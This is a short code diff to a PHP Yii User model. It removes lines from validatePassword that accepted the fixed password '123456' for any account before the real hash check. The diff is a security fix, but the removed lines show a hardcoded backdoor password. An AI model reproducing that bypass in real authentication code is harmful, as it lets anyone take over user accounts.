@@ -110,9 +110,6 @@ class User extends CActiveRecord
      */
     public function validatePassword($password)
     {
-        if($password=='123456'){
-            return true;
-        }
         return CPasswordHelper::verifyPassword($password,$this->password);
     }
 
